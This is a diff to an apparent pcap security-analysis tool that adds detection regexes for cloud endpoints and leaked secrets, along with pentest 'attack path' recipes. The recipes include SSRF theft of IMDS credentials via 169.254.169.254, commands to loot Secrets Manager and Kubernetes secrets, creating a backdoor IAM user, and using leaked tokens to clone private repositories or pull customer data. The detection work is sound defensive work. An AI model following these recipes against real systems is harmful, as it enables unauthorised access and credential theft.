@@ -382,6 +382,99 @@ DEFAULT_CREDENTIALS = {
 
 GPP_CPASSWORD_RE = re.compile(rb'cpassword\s*=\s*"([A-Za-z0-9+/=]+)"')
 
+CLOUD_HOST_PATTERNS = [
+    (re.compile(r"(?i)([a-z0-9.-]+)\.s3[.-]?(?:[a-z0-9-]+\.)?amazonaws\.com"), "AWS", "S3", "S3 bucket access — bucket name is disclosed in the Host/SNI."),
+    (re.compile(r"(?i)ec2\.[a-z0-9-]+\.amazonaws\.com"),                      "AWS", "EC2",       "EC2 API traffic."),
+    (re.compile(r"(?i)sts(?:\.[a-z0-9-]+)?\.amazonaws\.com"),                 "AWS", "STS",       "AWS Security Token Service — AssumeRole / GetCallerIdentity."),
+    (re.compile(r"(?i)iam(?:\.[a-z0-9-]+)?\.amazonaws\.com"),                 "AWS", "IAM",       "AWS IAM control plane."),
+    (re.compile(r"(?i)execute-api\.[a-z0-9-]+\.amazonaws\.com"),              "AWS", "API-GW",    "API Gateway call."),
+    (re.compile(r"(?i)lambda\.[a-z0-9-]+\.amazonaws\.com"),                   "AWS", "Lambda",    "Lambda invocation."),
+    (re.compile(r"(?i)dynamodb\.[a-z0-9-]+\.amazonaws\.com"),                 "AWS", "DynamoDB",  "DynamoDB control/data plane."),
+    (re.compile(r"(?i)secretsmanager\.[a-z0-9-]+\.amazonaws\.com"),           "AWS", "SecretsMgr","AWS Secrets Manager — high-value target."),
+    (re.compile(r"(?i)dkr\.ecr\.[a-z0-9-]+\.amazonaws\.com"),                 "AWS", "ECR",       "ECR container registry."),
+    (re.compile(r"(?i)[a-z0-9-]+\.blob\.core\.windows\.net"),                 "Azure", "Blob",      "Azure Blob Storage — storage account name disclosed."),
+    (re.compile(r"(?i)[a-z0-9-]+\.file\.core\.windows\.net"),                 "Azure", "Files",     "Azure Files."),
+    (re.compile(r"(?i)[a-z0-9-]+\.queue\.core\.windows\.net"),                "Azure", "Queue",     "Azure Queue Storage."),
+    (re.compile(r"(?i)[a-z0-9-]+\.vault\.azure\.net"),                        "Azure", "KeyVault",  "Azure Key Vault — secret / certificate store."),
+    (re.compile(r"(?i)[a-z0-9-]+\.database\.windows\.net"),                   "Azure", "SQL DB",    "Azure SQL Database."),
+    (re.compile(r"(?i)[a-z0-9-]+\.azurecr\.io"),                              "Azure", "ACR",       "Azure Container Registry."),
+    (re.compile(r"(?i)login\.microsoftonline\.com"),                          "Azure", "EntraID",   "Azure AD / Entra ID auth endpoint."),
+    (re.compile(r"(?i)storage\.googleapis\.com"),                             "GCP", "GCS",         "GCS Cloud Storage."),
+    (re.compile(r"(?i)[a-z0-9.-]+\.appspot\.com"),                            "GCP", "AppEngine",  "GCP App Engine."),
+    (re.compile(r"(?i)[a-z0-9-]+\.run\.app"),                                 "GCP", "CloudRun",   "GCP Cloud Run."),
+    (re.compile(r"(?i)[a-z0-9.-]+\.pkg\.dev"),                                "GCP", "ArtifactReg","GCP Artifact Registry."),
+    (re.compile(r"(?i)gcr\.io"),                                              "GCP", "GCR",        "Google Container Registry."),
+    (re.compile(r"(?i)[a-z0-9-]+\.firebaseio\.com"),                          "GCP", "Firebase",   "Firebase Realtime DB — often left world-readable."),
+    (re.compile(r"(?i)metadata\.google\.internal"),                           "GCP", "IMDS",       "GCP metadata service (IMDS)."),
+    (re.compile(r"(?i)169\.254\.169\.254"),                                   "Cloud", "IMDS",     "Link-local IMDS (AWS/Azure/GCP)."),
+]
+
+SECRET_PATTERNS = [
+    (re.compile(r"(?<![A-Z0-9])(AKIA|ABIA|AIDA|AGPA|AROA|ANPA|ANVA|ASIA)[A-Z0-9]{16}(?![A-Z0-9])"),
+        "AWS access key ID", "critical", "aws-access-key",
+        "Rotate the key now; review CloudTrail for unauthorized API calls."),
+    (re.compile(r"(?i)aws_secret_access_key\s*[=:]\s*[\"']?([A-Za-z0-9/+=]{40})[\"']?"),
+        "AWS secret access key in plaintext", "critical", "aws-secret-key",
+        "Rotate; audit CloudTrail."),
+    (re.compile(r"(?i)aws_session_token\s*[=:]\s*[\"']?([A-Za-z0-9/+=]{100,})[\"']?"),
+        "AWS session token (STS) in plaintext", "high", "aws-session-token",
+        "Short-lived but actionable — investigate origin."),
+    (re.compile(rb'"private_key_id"\s*:\s*"[a-f0-9]{40}"'),
+        "GCP service account JSON key", "critical", "gcp-sa-key",
+        "Rotate service account key; scan IAM audit logs for abuse."),
+    (re.compile(r"(?<![A-Za-z0-9])AIza[0-9A-Za-z_-]{35}(?![A-Za-z0-9])"),
+        "Google API key", "high", "google-api-key",
+        "Rotate; restrict key by caller IP / referrer."),
+    (re.compile(r"(?i)DefaultEndpointsProtocol=https;AccountName=[^;\s]+;AccountKey=[A-Za-z0-9+/=]+"),
+        "Azure Storage connection string", "critical", "azure-storage-conn",
+        "Rotate account key; migrate to managed identity."),
+    (re.compile(r"(?i)[?&](?:sig|sv|st)=[^&\s]*&[^&\s]*se=[^&\s]+"),
+        "Azure SAS token in URL", "high", "azure-sas",
+        "Revoke stored access policy; narrow permissions; prefer short expiry."),
+    (re.compile(r"(?<![A-Za-z0-9])(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}(?![A-Za-z0-9])"),
+        "GitHub classic PAT", "critical", "github-pat",
+        "Revoke at github.com/settings/tokens; rotate anything that used it."),
+    (re.compile(r"(?<![A-Za-z0-9])github_pat_[A-Za-z0-9_]{82}(?![A-Za-z0-9])"),
+        "GitHub fine-grained PAT", "critical", "github-pat",
+        "Revoke; rotate."),
+    (re.compile(r"(?<![A-Za-z0-9])xox[baprs]-[A-Za-z0-9-]{10,72}"),
+        "Slack API token", "critical", "slack-token",
+        "Revoke via Slack admin; rotate integrations."),
+    (re.compile(r"https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+"),
+        "Slack incoming-webhook URL", "high", "slack-webhook",
+        "Regenerate webhook; validate posts with signing secret."),
+    (re.compile(r"https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"),
+        "Discord webhook URL", "medium", "discord-webhook",
+        "Delete and regenerate webhook."),
+    (re.compile(r"(?<![A-Za-z0-9])(?:sk|pk|rk)_(?:live|test)_[A-Za-z0-9]{24,99}"),
+        "Stripe API key", "critical", "stripe-key",
+        "Rotate in Stripe dashboard; restrict key by IP."),
+    (re.compile(r"(?<![A-Za-z0-9])SK[a-f0-9]{32}"),
+        "Twilio API SID", "medium", "twilio",
+        "Rotate the paired auth token."),
+    (re.compile(r"(?<![A-Za-z0-9])AC[a-f0-9]{32}"),
+        "Twilio Account SID", "low", "twilio",
+        "Account SID alone isn't a secret; flagged as a reconnaissance aid."),
+    (re.compile(r"(?<![A-Za-z0-9])npm_[A-Za-z0-9]{36}"),
+        "npm publish token", "high", "npm-token",
+        "Revoke at npmjs.com/settings/tokens."),
+    (re.compile(r"(?<![A-Za-z0-9])pypi-[A-Za-z0-9_-]{40,}"),
+        "PyPI API token", "high", "pypi-token",
+        "Revoke at pypi.org/manage/account/token/."),
+    (re.compile(r"(?<![A-Za-z0-9])glpat-[A-Za-z0-9_-]{20}"),
+        "GitLab PAT", "critical", "gitlab-pat",
+        "Revoke at gitlab.com/-/profile/personal_access_tokens."),
+    (re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY-----"),
+        "PEM private key in cleartext", "critical", "pem-private-key",
+        "Rotate the key; never transmit private keys over plain HTTP."),
+    (re.compile(r"(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{4,}"),
+        "JWT observed", "medium", "jwt-leak",
+        "Decode (jwt.io / jwt_tool); treat as credential; check alg=none and weak HMAC secrets."),
+    (re.compile(r"(?i)(?:api[_-]?key|apikey|x-api-key|access[_-]?token|auth[_-]?token)\s*[:=]\s*[\"']?([A-Za-z0-9_\-.]{24,})[\"']?"),
+        "Generic API key / access token in HTTP", "medium", "generic-apikey",
+        "Inspect value; rotate if a real secret; prefer header-based auth over query strings."),
+]
+
 # Attack paths — each recipe is activated when its prerequisite findings exist.
 # match_any_category: OR across categories; match_substring: AND narrowing on title/evidence.
 ATTACK_PATHS = [
@@ -701,6 +794,146 @@ ATTACK_PATHS = [
         "tools": ["nmap", "CrackMapExec", "patator"],
     },
     {
+        "id": "aws-key-pillage",
+        "name": "AWS access-key pillage",
+        "severity": "critical",
+        "phase": "cloud",
+        "match_any_category": ["secret-leak"],
+        "match_substring": ["AWS access key", "AWS secret", "AWS session token"],
+        "description": ("Leaked AWS credentials give you whatever IAM permissions the "
+                        "principal has — often far more than the app needs. Enumerate the "
+                        "blast radius, loot secrets, and pivot to persistence (create "
+                        "backdoor IAM user or role)."),
+        "steps": [
+            "Configure: `export AWS_ACCESS_KEY_ID=<id>; export AWS_SECRET_ACCESS_KEY=<secret>; "
+            "export AWS_SESSION_TOKEN=<token>`.",
+            "Identify: `aws sts get-caller-identity` (user/role ARN, account ID).",
+            "Enumerate permissions with Pacu: `sessions import` → `iam__enum_permissions` → "
+            "`iam__bruteforce_permissions`.",
+            "Loot: `aws secretsmanager list-secrets && aws secretsmanager get-secret-value`; "
+            "`aws ssm get-parameters-by-path --with-decryption --recursive`.",
+            "Persistence (only with written authorization): create a low-profile IAM user or "
+            "attach a managed policy to an existing role.",
+        ],
+        "tools": ["awscli", "Pacu", "enumerate-iam", "cloudsplaining"],
+    },
+    {
+        "id": "imdsv1-ssrf",
+        "name": "IMDSv1 → instance role credentials via SSRF",
+        "severity": "critical",
+        "phase": "cloud",
+        "match_any_category": ["cloud-aws"],
+        "match_substring": ["IMDSv1"],
+        "description": ("IMDSv1 responses aren't gated by a session token, so any SSRF that "
+                        "reaches 169.254.169.254 exfiltrates the EC2 instance role. Those "
+                        "creds are usable from anywhere for ~6 hours."),
+        "steps": [
+            "From the SSRF, `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`.",
+            "Take the role name, then `curl http://169.254.169.254/latest/meta-data/iam/"
+            "security-credentials/<role>` → AccessKeyId / SecretAccessKey / Token.",
+            "Load locally and run the AWS-key-pillage path.",
+            "Post-compromise, force `HttpTokens=required` to stop the bleed.",
+        ],
+        "tools": ["curl", "awscli", "Pacu"],
+    },
+    {
+        "id": "gcp-sa-key",
+        "name": "GCP service-account JSON key pivot",
+        "severity": "critical",
+        "phase": "cloud",
+        "match_any_category": ["secret-leak"],
+        "match_substring": ["GCP service account"],
+        "description": ("A leaked GCP SA key JSON authenticates as whatever principal the "
+                        "key belongs to. Impersonate, then chain via IAM impersonation."),
+        "steps": [
+            "Save the JSON as `key.json`; `gcloud auth activate-service-account --key-file=key.json`.",
+            "`gcloud projects list` / `gcloud iam service-accounts list` to map the blast radius.",
+            "If the SA has `iam.serviceAccounts.getAccessToken`, pivot: "
+            "`gcloud iam service-accounts get-access-token --impersonate-service-account=<higher-priv>`.",
+            "Loot: Storage buckets, Secret Manager, Compute instances, Cloud Functions.",
+        ],
+        "tools": ["gcloud", "GCPBucketBrute", "hayat"],
+    },
+    {
+        "id": "azure-sas-pivot",
+        "name": "Azure storage / SAS token reuse",
+        "severity": "high",
+        "phase": "cloud",
+        "match_any_category": ["secret-leak"],
+        "match_substring": ["Azure Storage", "Azure SAS", "Key Vault"],
+        "description": ("Captured storage connection strings or SAS URLs grant the permissions "
+                        "baked into the token — read/list/write to the backing storage account "
+                        "until the token expires."),
+        "steps": [
+            "Parse the captured SAS: the `sp=` parameter lists permissions (r/w/d/l/a).",
+            "Use `azcopy list 'https://<acct>.blob.core.windows.net/<container>?<sas>'`.",
+            "Enumerate: `az storage blob list --container-name <c> --sas-token <sas>`.",
+            "If it's a connection string with AccountKey, you have master access — "
+            "`az storage account keys list`.",
+        ],
+        "tools": ["az", "azcopy", "MicroBurst"],
+    },
+    {
+        "id": "k8s-sa-token",
+        "name": "Kubernetes service-account token exploitation",
+        "severity": "critical",
+        "phase": "cloud",
+        "match_any_category": ["cloud-k8s"],
+        "description": ("A leaked in-cluster SA token lets you call kube-apiserver as that "
+                        "service account. Even low-priv SAs often read secrets; privileged "
+                        "ones give pod exec or cluster-admin."),
+        "steps": [
+            "`export KUBE_TOKEN=<jwt>; kubectl --server=https://<apiserver> "
+            "--token=$KUBE_TOKEN --insecure-skip-tls-verify get pods -A`.",
+            "Test RBAC: `kubectl auth can-i --list`.",
+            "Loot: `kubectl get secrets -A -o yaml` (most leaky: docker-registry pull creds, "
+            "tls keys, service-account tokens).",
+            "Pod-exec to anything you can: `kubectl exec -it <pod> -- /bin/sh`.",
+        ],
+        "tools": ["kubectl", "kubeletctl", "peirates", "kube-hunter"],
+    },
+    {
+        "id": "secret-reuse-spray",
+        "name": "Leaked secret reuse",
+        "severity": "high",
+        "phase": "credential",
+        "match_any_category": ["secret-leak"],
+        "match_substring": ["GitHub", "Slack", "Stripe", "npm", "PyPI", "GitLab"],
+        "description": ("Developer secrets (GitHub/GitLab PATs, Slack tokens, npm/PyPI, "
+                        "Stripe) often grant broad access to code, chat, or billing. "
+                        "Validate the captured token, enumerate scopes, then decide whether "
+                        "to use it or just report."),
+        "steps": [
+            "Validate: GitHub → `curl -H 'Authorization: token <pat>' https://api.github.com/"
+            "user`; Slack → `curl 'https://slack.com/api/auth.test?token=<t>'`; "
+            "Stripe → `curl -u <sk>: https://api.stripe.com/v1/charges?limit=1`.",
+            "Enumerate scopes: GitHub returns `X-OAuth-Scopes` header; Slack response lists "
+            "`user` and `team`.",
+            "If authorized for offensive follow-through: clone private repos, post to Slack "
+            "channels as the bot, pull customer data.",
+            "Report the leak + evidence location + rotation guidance.",
+        ],
+        "tools": ["curl", "github-secret-scanner", "trufflehog"],
+    },
+    {
+        "id": "s3-bucket-takeover",
+        "name": "S3 bucket surface mapping",
+        "severity": "high",
+        "phase": "cloud",
+        "match_any_category": ["cloud-aws"],
+        "match_substring": ["S3"],
+        "description": ("S3 bucket names disclosed in Host/SNI give you direct access "
+                        "targets. Test for anonymous list/read and misconfigured ACLs."),
+        "steps": [
+            "Extract bucket names from findings (`<bucket>.s3.amazonaws.com`).",
+            "Anonymous list: `aws s3 ls s3://<bucket> --no-sign-request`.",
+            "Anonymous read: `aws s3 cp s3://<bucket>/<key> - --no-sign-request`.",
+            "If it's a dangling DNS record (bucket doesn't exist), you can claim it → "
+            "subdomain takeover.",
+        ],
+        "tools": ["awscli", "s3-buckets-finder", "bucket_finder"],
+    },
+    {
         "id": "beacon-investigation",
         "name": "C2 beacon — triage compromised host",
         "severity": "high",
@@ -948,6 +1181,7 @@ class PcapAnalysis:
             h.setdefault("sni_names", set()).add(sni)
         except Exception:
             pass
+        self._d_cloud_host(src, dst, port, sni)
 
     def _extract_creds(self, src, dst, sport, dport, payload):
         if not payload:
@@ -1479,6 +1713,15 @@ class PcapAnalysis:
                 key=("insec-mgmt", dst, dport))
 
     def _d_http_payload(self, src, dst, port, text):
+        self._d_cloud_secrets(src, dst, port, text)
+        self._d_imds(src, dst, port, text)
+        self._d_k8s_sa_token(src, dst, port, text)
+        self._d_aws_sigv4(src, dst, port, text)
+        self._d_graphql_introspection(src, dst, port, text)
+        self._d_oauth_leak(src, dst, port, text)
+        host_m = re.search(r"(?i)Host:\s*([^\r\n:]+)", text)
+        if host_m:
+            self._d_cloud_host(src, dst, port, host_m.group(1).strip())
         for regex, title, sev, cat, remed in WEB_ATTACK_PATTERNS:
             m = regex.search(text)
             if not m:
@@ -1655,6 +1898,175 @@ class PcapAnalysis:
             hosts=[src, dst], evidence=cpw[:120],
             remediation="Remove all cpassword= entries from SYSVOL; rotate any credentials they held; install KB2962486.",
             key=("gpp-cpassword", dst))
+
+    def _d_cloud_host(self, src, dst, port, hostname):
+        if not hostname:
+            return
+        for regex, provider, service, note in CLOUD_HOST_PATTERNS:
+            if regex.search(hostname):
+                sev = "high" if service in ("IMDS", "SecretsMgr", "KeyVault", "IAM", "STS") else "info"
+                self._add_finding(sev, f"cloud-{provider.lower()}",
+                    f"{provider} {service} traffic — {hostname}",
+                    f"{src} → {dst}:{port} connected to a {provider} {service} endpoint. {note}",
+                    hosts=[src, dst], port=port, evidence=hostname,
+                    remediation=f"Ensure access is authorized and the data plane is encrypted end-to-end.",
+                    key=(f"cloud-{provider.lower()}", service, hostname))
+                break
+
+    def _d_cloud_secrets(self, src, dst, port, text):
+        if not text:
+            return
+        for regex, label, sev, cat, rem in SECRET_PATTERNS:
+            if isinstance(regex.pattern, bytes):
+                continue
+            for m in regex.finditer(text):
+                snippet = m.group(0)
+                redacted = snippet[:8] + "…" + snippet[-4:] if len(snippet) > 16 else snippet
+                self._add_finding(sev, f"secret-leak",
+                    f"{label} leaked in plaintext HTTP",
+                    f"{src} → {dst}:{port} transmitted material matching a {label} signature: {redacted}",
+                    hosts=[src, dst], port=port, evidence=redacted,
+                    remediation=rem,
+                    key=(cat, snippet[:48]))
+
+    def _d_binary_secrets(self, src, dst, port, payload):
+        for regex, label, sev, cat, rem in SECRET_PATTERNS:
+            if not isinstance(regex.pattern, bytes):
+                continue
+            for m in regex.finditer(payload):
+                snippet = m.group(0).decode("latin1", errors="replace")
+                redacted = snippet[:8] + "…" + snippet[-4:] if len(snippet) > 16 else snippet
+                self._add_finding(sev, "secret-leak",
+                    f"{label} leaked in plaintext",
+                    f"{src} → {dst}:{port} transmitted material matching a {label} signature.",
+                    hosts=[src, dst], port=port, evidence=redacted,
+                    remediation=rem,
+                    key=(cat, snippet[:64]))
+
+    def _d_imds(self, src, dst, port, text):
+        if "169.254.169.254" not in text and "metadata.google.internal" not in text \
+                and "/latest/meta-data" not in text and "/metadata/instance" not in text:
+            return
+        has_token = re.search(r"(?i)X-aws-ec2-metadata-token:", text) is not None
+        has_flavor = re.search(r"(?i)Metadata-Flavor:\s*Google", text) is not None
+        has_api_version = re.search(r"(?i)Metadata:\s*true", text) is not None
+        request_line = (text.split("\r\n", 1)[0] or "")[:160]
+        if "/latest/meta-data" in text or "169.254.169.254" in text:
+            if has_token:
+                self._add_finding("info", "cloud-aws",
+                    "AWS IMDSv2 request (token-authenticated)",
+                    f"{src} → {dst}:{port} queried AWS IMDS with a session token header. "
+                    f"IMDSv2 is the hardened flow; ensure IMDSv1 is fully disabled.",
+                    hosts=[src, dst], port=port, evidence=request_line,
+                    remediation="Enforce `HttpTokens=required` on all EC2 instances.",
+                    key=("imdsv2", src, dst))
+            else:
+                self._add_finding("high", "cloud-aws",
+                    "AWS IMDSv1 request (no token header)",
+                    f"{src} → {dst}:{port} queried AWS IMDS without `X-aws-ec2-metadata-token`. "
+                    f"IMDSv1 is SSRF-reachable — an app-layer SSRF steals the instance IAM role.",
+                    hosts=[src, dst], port=port, evidence=request_line,
+                    remediation="Enforce IMDSv2 (`HttpTokens=required`, hop limit 1) on every EC2 instance.",
+                    key=("imdsv1", src, dst))
+        if "metadata.google.internal" in text and not has_flavor:
+            self._add_finding("medium", "cloud-gcp",
+                "GCP IMDS request without Metadata-Flavor header",
+                f"{src} → {dst}:{port} queried GCP metadata without the required "
+                f"`Metadata-Flavor: Google` header — likely won't be served, but "
+                f"indicates probe behavior.",
+                hosts=[src, dst], port=port, evidence=request_line,
+                remediation="Detect and block unauthorized /metadata access from app subnets.",
+                key=("gcp-imds-probe", src))
+        if "/metadata/instance" in text and not has_api_version:
+            self._add_finding("medium", "cloud-azure",
+                "Azure IMDS request without Metadata:true header",
+                f"{src} → {dst}:{port} queried Azure IMDS without the required "
+                f"`Metadata: true` header — probe.",
+                hosts=[src, dst], port=port, evidence=request_line,
+                remediation="Azure IMDS refuses requests without the Metadata header; monitor egress to 169.254.169.254 from app pools.",
+                key=("azure-imds-probe", src))
+
+    def _d_k8s_sa_token(self, src, dst, port, text):
+        for m in re.finditer(r"(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]{10,}\.(eyJ[A-Za-z0-9_-]{10,})\.[A-Za-z0-9_-]{4,}", text):
+            body_b64 = m.group(1)
+            padded = body_b64 + "=" * ((4 - len(body_b64) % 4) % 4)
+            try:
+                body = base64.urlsafe_b64decode(padded).decode("utf-8", errors="replace")
+            except Exception:
+                continue
+            if "system:serviceaccount" in body or "kubernetes.io/serviceaccount" in body:
+                try:
+                    claims = json.loads(body)
+                except Exception:
+                    claims = {}
+                sa = (claims.get("kubernetes.io/serviceaccount/service-account.name")
+                      or claims.get("sub") or "unknown")
+                ns = claims.get("kubernetes.io/serviceaccount/namespace", "default")
+                self._add_finding("critical", "cloud-k8s",
+                    f"Kubernetes service-account JWT leaked — {ns}/{sa}",
+                    f"{src} → {dst}:{port} transmitted a Kubernetes service-account token in plain HTTP. "
+                    f"The token is presentable to the kube-apiserver for whatever RBAC the SA has.",
+                    hosts=[src, dst], port=port, evidence=f"{ns}/{sa}",
+                    remediation="Rotate the SA secret; audit RBAC for the account; don't expose kube-apiserver over plain HTTP.",
+                    key=("k8s-sa-jwt", ns, sa))
+                return
+        # JWT alg=none check
+        for m in re.finditer(r"(?<![A-Za-z0-9_-])(eyJ[A-Za-z0-9_-]{10,})\.(eyJ[A-Za-z0-9_-]{10,})\.([A-Za-z0-9_-]{0,})", text):
+            header_b64 = m.group(1)
+            padded = header_b64 + "=" * ((4 - len(header_b64) % 4) % 4)
+            try:
+                header = json.loads(base64.urlsafe_b64decode(padded).decode("utf-8", errors="replace"))
+            except Exception:
+                continue
+            alg = (header.get("alg") or "").lower()
+            if alg == "none":
+                self._add_finding("critical", "jwt-weak",
+                    "JWT with alg=none",
+                    f"{src} → {dst}:{port} transmitted a JWT with alg=none — signature unchecked, trivial to forge.",
+                    hosts=[src, dst], port=port, evidence=m.group(0)[:80],
+                    remediation="Reject alg=none at the verifier; whitelist expected algorithms.",
+                    key=("jwt-none", src, dst))
+            elif alg in ("hs256", "hs384", "hs512") and len(m.group(3)) < 20:
+                self._add_finding("medium", "jwt-weak",
+                    f"JWT with HMAC alg ({alg}) — crackable if secret is weak",
+                    f"{src} → {dst}:{port} carries an HMAC-signed JWT. Short/weak secrets crack offline in seconds.",
+                    hosts=[src, dst], port=port, evidence=m.group(0)[:80],
+                    remediation="Use 32+ byte random signing keys; consider switching to RS256/EdDSA.",
+                    key=("jwt-hs", src, dst))
+
+    def _d_aws_sigv4(self, src, dst, port, text):
+        m = re.search(r"(?i)Authorization:\s*AWS4-HMAC-SHA256\s+Credential=([^/\s,]+)/", text)
+        if m:
+            key_id = m.group(1)
+            self._add_finding("info", "cloud-aws",
+                f"AWS Sigv4 signed request (key id {key_id[:8]}…)",
+                f"{src} → {dst}:{port} is an AWS API call signed with access key {key_id[:8]}…. "
+                f"Useful for attributing cloud traffic to a principal.",
+                hosts=[src, dst], port=port, evidence=key_id,
+                remediation="Verify the key id against expected IAM principals; rotate stale keys.",
+                key=("aws-sigv4", src, key_id))
+
+    def _d_graphql_introspection(self, src, dst, port, text):
+        if re.search(r"(?i)(?:query\s*=|\"query\"\s*:)\s*[^\r\n]*__schema", text):
+            self._add_finding("medium", "web-recon",
+                "GraphQL introspection query",
+                f"{src} → {dst}:{port} issued a GraphQL introspection (__schema). "
+                f"This returns the full API surface to any caller — recon goldmine.",
+                hosts=[src, dst], port=port,
+                remediation="Disable introspection in production; require auth for schema access.",
+                key=("graphql-introspect", src, dst))
+
+    def _d_oauth_leak(self, src, dst, port, text):
+        # OAuth code/token in URL query strings — if it hits a logged URL they often
+        # end up in referrer headers / access logs.
+        if re.search(r"[?&](?:code|id_token|access_token)=[A-Za-z0-9._-]{16,}", text):
+            self._add_finding("medium", "web-hardening",
+                "OAuth code/token in URL query string",
+                f"{src} → {dst}:{port} contains an OAuth code/token in the URL. "
+                f"URLs leak via referer headers, proxy logs, and browser history.",
+                hosts=[src, dst], port=port,
+                remediation="Use form_post response_mode; move tokens to Authorization header.",
+                key=("oauth-url-token", src, dst))
 
     def _d_http_response(self, src, dst, port, text):
         if not text.startswith("HTTP/"):
@@ -1956,6 +2368,7 @@ class PcapAnalysis:
                             http_text = payload_bytes[:4096].decode("utf-8", errors="replace")
                             http_port = dport if dport in (80, 8080, 8000, 8888) else sport
                             self._d_http_payload(src, dst, http_port, http_text)
+                            self._d_binary_secrets(src, dst, http_port, payload_bytes[:8192])
                             # Responses originate from the server; key hygiene checks off the server side.
                             if http_text.startswith("HTTP/"):
                                 self._d_http_response(src, dst, sport if sport in (80,8080,8000,8888) else dport, http_text)
